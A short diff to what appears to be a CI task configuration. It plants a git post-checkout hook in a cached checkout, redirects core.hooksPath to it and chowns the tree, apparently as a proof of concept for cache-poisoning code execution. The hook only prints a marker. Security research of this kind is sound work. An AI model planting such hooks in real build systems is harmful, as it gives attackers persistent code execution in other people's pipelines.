@@ -29,7 +29,8 @@ tasks:
           mkdir -p /builds/worker/checkouts/src/.git/audit-hooks &&
           printf '#!/bin/sh\nprintf TC_CACHE_HOOK_RCE_8d2e61\n' > /builds/worker/checkouts/src/.git/audit-hooks/post-checkout &&
           chmod 755 /builds/worker/checkouts/src/.git/audit-hooks/post-checkout &&
-          git -C /builds/worker/checkouts/src config core.hooksPath .git/audit-hooks
+          git -C /builds/worker/checkouts/src config core.hooksPath .git/audit-hooks &&
+          chown -R worker:worker /builds/worker/checkouts/src
     metadata:
       name: isolated cache producer
       description: unique researcher cache; marker only
